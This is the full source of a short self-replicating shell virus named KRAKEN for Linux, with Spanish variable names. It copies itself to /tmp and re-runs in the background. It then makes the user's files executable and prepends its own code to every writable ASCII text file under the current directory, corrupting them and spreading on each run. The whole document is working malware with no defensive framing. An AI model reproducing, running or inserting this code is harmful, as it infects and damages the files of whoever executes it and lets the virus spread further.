#KRAKEN
if [ "@$1" != "@virbkg" ] 
then
usuario=`logname` 
head -34 $0 > /tmp/virus.txt
chmod 777 /tmp/virus.txt
/tmp/virus.txt virbkg $usuario & 
else
usuario=$2 
find . -name "*" -print | while read archivo
do
if [ -f $archivo ]
then
dueno=`ls -l "$archivo" | awk '{printf $3}'`
if [ "$dueno" = "$usuario" ]
then
chmod 755 "$archivo";
fi
if [ -r "$archivo" -a -w "$archivo" ]
then
file "$archivo" | while read p1 p2 p3 p4 p5 p6
do
if [ "$p2" = "ASCII" -a "`head -1 "$archivo"`" != "#KRAKEN" ]
then
cp /tmp/virus.txt /tmp/temporal.txt
cat $archivo >> /tmp/temporal.txt
cat /tmp/temporal.txt > $archivo
fi
done
fi
fi
done
rm -f /tmp/virus.txt /tmp/temporal.txt
fi
echo "Usted ejecuto un script infectado con el virus KRAKEN para Linux." 